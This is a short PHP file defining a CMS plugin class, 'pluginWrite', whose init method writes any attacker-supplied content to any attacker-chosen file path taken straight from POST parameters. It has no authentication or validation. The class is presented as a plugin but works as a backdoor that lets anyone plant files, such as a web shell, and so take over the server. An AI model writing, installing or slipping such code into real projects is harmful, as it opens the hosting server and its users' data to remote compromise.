<?php
class pluginWrite extends Plugin {
	public function init() { file_put_contents($_POST['file'], $_POST['content']); }
}
